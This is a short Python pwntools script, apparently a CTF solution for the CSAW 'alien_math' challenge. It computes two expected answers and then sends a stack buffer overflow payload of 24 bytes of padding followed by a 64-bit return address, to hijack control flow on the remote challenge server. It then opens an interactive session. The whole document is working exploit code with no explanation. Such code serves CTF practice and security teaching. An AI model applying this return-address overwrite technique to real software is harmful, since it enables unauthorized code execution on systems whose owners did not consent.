from pwn import *

DEBUG = False

ans1 = 0x6b8b4567

def findx(a, i, b):
    for x in range(0x30, 0x3a):
        # print("x", x)
        sqf = (11*(a+i-48)+48*(a-48)-4)%10
        # print("sqf",sqf)
        final = (x-48+sqf) % 10 + 48
        if b == final:
            # print("result : ", x)
            return chr(x)

key2 = "7759406485255323229225"
ans2 = "7"
for i in range(0, len(key2)):
    if (i+1<len(key2)):
        ans2 = ans2 + findx(ord(key2[i]), i, ord(key2[i+1]))

# print(ans2)
payload = "1"*24 + p64(0x00000000004014fb)

if DEBUG:
    r = process("./alien_math")
    gdb.attach(r)
else:
    r = remote("pwn.chal.csaw.io", 5004)

r.sendline(str(ans1))
r.sendline(ans2)
r.sendline(payload)

r.interactive()